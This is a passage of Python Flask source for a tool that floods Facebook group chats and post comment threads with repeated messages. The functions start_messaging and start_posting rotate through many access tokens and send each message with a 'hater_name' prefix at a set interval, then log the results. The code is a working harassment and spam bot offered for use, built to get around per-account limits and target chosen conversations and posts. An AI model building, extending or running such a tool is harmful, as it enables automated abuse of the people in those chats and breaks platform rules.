        elif "Target Post:" in log['message']:
            target = log['message'].split("Target Post:")[1].strip()
            break
    
    return render_template_string(
        LOG_TEMPLATE, 
        task_id=task_id, 
        logs=logs, 
        token_stats=stats,
        task_type=task_type,
        target=target,
        start_time=start_time
    )

def start_messaging(tokens, messages, convo_id, interval, hater_name, token_option, task_id, task_type):
    stop_event = stop_events[task_id]
    token_index = 0
    
    add_log(task_id, f"🚀 {task_type} task started for conversation: {convo_id}")
    
    # Get group name info once at start
    token = tokens[0]
    group_name = get_group_name(convo_id, token)
    if group_name:
        add_log(task_id, f"ℹ️ Target Group: {group_name}")
    
    while not stop_event.is_set():
        for msg in messages:
            if stop_event.is_set():
                add_log(task_id, "🛑 Task stopped manually.")
                break
            
            # Select token based on current index
            current_token = tokens[token_index]
            token_display = f"Token {token_index + 1}/{len(tokens)}"
            
            # Send message
            send_msg(convo_id, current_token, msg, hater_name, task_id, token_display)
            
            # Update token usage stats
            with data_lock:
                token_usage_stats[task_id][current_token] = token_usage_stats[task_id].get(current_token, 0) + 1
            
            # Rotate to next token
            token_index = (token_index + 1) % len(tokens)
            
            time.sleep(interval)

def start_posting(tokens, messages, post_id, interval, hater_name, token_option, task_id):
    stop_event = stop_events[task_id]
    token_index = 0
    
    add_log(task_id, f"🚀 Post task started for post: {post_id}")
    
    # Get post info once at start
    token = tokens[0]
    post_info = get_post_info(post_id, token)
    if post_info:
        add_log(task_id, f"ℹ️ Target Post: {post_info}")
    
    while not stop_event.is_set():
        for msg in messages:
            if stop_event.is_set():
                add_log(task_id, "🛑 Task stopped manually.")
                break
            
            # Select token based on current index
            current_token = tokens[token_index]
            token_display = f"Token {token_index + 1}/{len(tokens)}"
            
            # Send comment
            send_comment(post_id, current_token, msg, hater_name, task_id, token_display)
            
            # Update token usage stats
            with data_lock:
                token_usage_stats[task_id][current_token] = token_usage_stats[task_id].get(current_token, 0) + 1
            
            # Rotate to next token
            token_index = (token_index + 1) % len(tokens)
            
            time.sleep(interval)

def get_group_name(convo_id, token):
    try:
        url = f"https://graph.facebook.com/v15.0/t_{convo_id}?fields=name,participants&access_token={token}"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            name = data.get("name")
            if not name:
                participants = data.get("participants", {}).get("data", [])
                participant_names = [p.get("name", "Unknown") for p in participants]
                name = ", ".join(participant_names) if participant_names else "Group Chat"
            return name
        return None
    except:
        return None

def get_post_info(post_id, token):
    try:
        url = f"https://graph.facebook.com/v15.0/{post_id}?fields=message,from&access_token={token}"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            message = data.get("message", "No message")[:50] + "..." if data.get("message") else "No message"
            from_name = data.get("from", {}).get("name", "Unknown")
            return f"Post by {from_name}: {message}"
        return None
    except:
        return None

def send_msg(convo_id, access_token, message, hater_name, task_id, token_display=""):
    try:
        url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
        parameters = {
            "access_token": access_token,
            "message": f"{hater_name} {message}"  # Modified to remove colon
        }
        headers = {"Authorization": f"Bearer {access_token}"}
        response = requests.post(url, json=parameters, headers=headers)
        
        # Get sender name for logging
        sender_name = get_sender_name(access_token)
        
        if response.status_code == 200:
            log_msg = f"✅ {token_display} | {sender_name} | Message sent: {hater_name}: {message}"  # Keep colon in logs
            add_log(task_id, log_msg)
        else:
            log_msg = f"❌ {token_display} | {sender_name} | Failed (Code: {response.status_code}): {response.text}"
            add_log(task_id, log_msg)
    except Exception as e:
        log_msg = f"❌ {token_display} | Error: {str(e)}"
        add_log(task_id, log_msg)

def send_comment(post_id, access_token, message, hater_name, task_id, token_display=""):
    try:
        url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
        parameters = {
            "access_token": access_token,
            "message": f"{hater_name} {message}"  # Modified to remove colon
        }
        headers = {"Authorization": f"Bearer {access_token}"}
        response = requests.post(url, json=parameters, headers=headers)
        
        # Get sender name for logging
        sender_name = get_sender_name(access_token)
        
        if response.status_code == 200:
            log_msg = f"✅ {token_display} | {sender_name} | Comment sent: {hater_name}: {message}"  # Keep colon in logs
            add_log(task_id, log_msg)
        else:
            log_msg = f"❌ {token_display} | {sender_name} | Failed (Code: {response.status_code}): {response.text}"
            add_log(task_id, log_msg)
    except Exception as e:
        log_msg = f"❌ {token_display} | Error: {str(e)}"
        add_log(task_id, log_msg)

def get_sender_name(token):
    try:
        url = f"https://graph.facebook.com/me?fields=name&access_token={token}"
        response = requests.get(url)
        if response.status_code == 200:
            return response.json().get("name", "Unknown")
        return "Unknown"
    except:
        return "Unknown"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)

